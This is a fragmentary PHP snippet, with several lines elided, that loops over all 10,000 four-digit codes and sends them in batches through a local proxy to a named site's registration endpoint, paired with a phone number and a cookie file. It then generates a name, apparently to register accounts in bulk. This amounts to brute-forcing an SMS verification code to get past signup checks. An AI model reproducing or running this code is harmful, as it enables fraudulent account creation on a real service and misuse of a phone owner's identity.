...
//    $phone = '13803895149';
    ...
    $curlObj->setUrl($url);
    $curlObj->setProxyIp("http://localhost:8899/");
    ...
    for($i=0;$i<=999;$i++) {
        ...
        for($ii=0;$ii<=9;$ii++) {
            echo $code,"\r\n";
            $code = $ii . str_pad($i, 3, '0', STR_PAD_LEFT);
            $urlArr[] = "https://in.ibeechat.com/enroll/register?uid=86{$phone}&code={$code}";
        }
        $resArr = $curlObj->multi($urlArr, $cookfile);
//        print_r($resArr);die();
        if ($resArr) {
            $name = createName();
